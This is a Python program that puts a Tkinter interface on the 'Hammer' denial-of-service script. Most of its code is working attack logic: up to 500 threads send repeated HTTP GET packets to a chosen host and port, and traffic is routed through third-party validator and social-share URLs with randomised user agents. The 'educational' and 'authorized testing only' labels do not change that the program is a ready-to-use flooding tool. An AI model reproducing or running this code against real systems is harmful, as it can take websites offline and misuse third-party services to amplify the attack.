#!/usr/bin/python3
# -*- coding: utf-8 -*-

import tkinter as tk
from tkinter import messagebox, ttk
import threading
import sys
import socket
import time
import urllib.request
import random
from queue import Queue

# --- Original Hammer logic (modified for GUI integration) ---

uagent = []
bots = []

def init_user_agents():
    global uagent
    uagent = [
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
    ]

def init_bots():
    global bots
    bots = [
        "http://validator.w3.org/check?uri=",
        "http://www.facebook.com/sharer/sharer.php?u="
    ]

# Simulated data from headers.txt (since file may not exist)
data = "Accept: text/html,application/xhtml+xml\nConnection: keep-alive"

q = Queue()
w = Queue()

# Global stop flag for threads
stop_attack = False

def bot_hammering(url):
    global stop_attack
    try:
        while not stop_attack:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            print("Bot hammering...")
            time.sleep(0.1)
    except:
        pass

def down_it(host, port):
    global stop_attack
    try:
        while not stop_attack:
            packet = f"GET / HTTP/1.1\nHost: {host}\n\nUser-Agent: {random.choice(uagent)}\n{data}".encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, int(port)))
            s.sendto(packet, (host, int(port)))
            s.shutdown(socket.SHUT_RDWR)
            s.close()
            print(f"<-- Packet sent to {host}:{port} -->")
            time.sleep(0.1)
    except Exception as e:
        print(f"Error: {e}")

def dos_worker(host, port):
    while not stop_attack:
        try:
            item = q.get(timeout=1)
            if item is None:
                break
            down_it(host, port)
            q.task_done()
        except:
            break

def bot_worker(host):
    while not stop_attack:
        try:
            item = w.get(timeout=1)
            if item is None:
                break
            bot_hammering(random.choice(bots) + f"http://{host}")
            w.task_done()
        except:
            break

def start_attack(host, port, turbo, log_callback):
    global stop_attack
    stop_attack = False

    # Validate host/port
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, int(port)))
        s.close()
    except Exception as e:
        log_callback(f"❌ Failed to connect to {host}:{port}\n{str(e)}")
        return

    log_callback(f"✅ Starting attack on {host}:{port} with {turbo} threads...")

    init_user_agents()
    init_bots()

    # Start threads
    for _ in range(turbo):
        t1 = threading.Thread(target=dos_worker, args=(host, port), daemon=True)
        t2 = threading.Thread(target=bot_worker, args=(host,), daemon=True)
        t1.start()
        t2.start()

    # Feed queues
    def feed_queues():
        item = 0
        while not stop_attack:
            if item > 1800:
                item = 0
            item += 1
            q.put(item)
            w.put(item)
            time.sleep(0.01)
        # Signal stop
        for _ in range(turbo * 2):
            q.put(None)
            w.put(None)

    feeder = threading.Thread(target=feed_queues, daemon=True)
    feeder.start()

def stop_attack_func():
    global stop_attack
    stop_attack = True

# --- GUI Code ---
class HammerGUI:
    def __init__(self, root):
        self.root = root
        root.title("Hammer DoS Tool - EDUCATIONAL USE ONLY")
        root.geometry("500x400")
        root.resizable(False, False)

        # Warning label
        warning = tk.Label(root, text="⚠️ FOR AUTHORIZED TESTING ONLY", fg="red", font=("Arial", 10, "bold"))
        warning.pack(pady=5)

        # Host
        tk.Label(root, text="Target Host (IP or Domain):").pack(anchor='w', padx=20, pady=(10,0))
        self.host_entry = tk.Entry(root, width=40)
        self.host_entry.pack(padx=20)
        self.host_entry.insert(0, "127.0.0.1")

        # Port
        tk.Label(root, text="Port:").pack(anchor='w', padx=20, pady=(10,0))
        self.port_entry = tk.Entry(root, width=10)
        self.port_entry.pack(padx=20, anchor='w')
        self.port_entry.insert(0, "80")

        # Turbo (threads)
        tk.Label(root, text="Turbo (Threads):").pack(anchor='w', padx=20, pady=(10,0))
        self.turbo_entry = tk.Entry(root, width=10)
        self.turbo_entry.pack(padx=20, anchor='w')
        self.turbo_entry.insert(0, "135")

        # Buttons
        button_frame = tk.Frame(root)
        button_frame.pack(pady=15)

        self.start_btn = tk.Button(button_frame, text="Start Attack", bg="#4CAF50", fg="white", command=self.start_attack)
        self.start_btn.pack(side='left', padx=5)

        self.stop_btn = tk.Button(button_frame, text="Stop", bg="#f44336", fg="white", command=self.stop_attack)
        self.stop_btn.pack(side='left', padx=5)

        # Log box
        tk.Label(root, text="Log Output:").pack(anchor='w', padx=20, pady=(10,0))
        self.log_text = tk.Text(root, height=10, width=60, state='disabled', bg="#f0f0f0")
        self.log_text.pack(padx=20, pady=5)

        # Scrollbar
        scrollbar = tk.Scrollbar(root, orient='vertical', command=self.log_text.yview)
        scrollbar.place(x=460, y=200, height=165)
        self.log_text.config(yscrollcommand=scrollbar.set)

    def log(self, msg):
        self.log_text.config(state='normal')
        self.log_text.insert('end', msg + '\n')
        self.log_text.see('end')
        self.log_text.config(state='disabled')

    def start_attack(self):
        host = self.host_entry.get().strip()
        port = self.port_entry.get().strip()
        turbo = self.turbo_entry.get().strip()

        if not host:
            messagebox.showerror("Input Error", "Please enter a host.")
            return
        if not port.isdigit():
            messagebox.showerror("Input Error", "Port must be a number.")
            return
        if not turbo.isdigit() or int(turbo) < 1:
            messagebox.showerror("Input Error", "Turbo must be a positive integer.")
            return

        port = int(port)
        turbo = min(int(turbo), 500)  # Limit to avoid crashing

        self.log(f"[{time.ctime()}] Launching attack on {host}:{port}...")
        threading.Thread(target=start_attack, args=(host, port, turbo, self.log), daemon=True).start()

    def stop_attack(self):
        stop_attack_func()
        self.log("[INFO] Attack stopped by user.")

# --- Run GUI ---
if __name__ == "__main__":
    root = tk.Tk()
    app = HammerGUI(root)
    root.mainloop()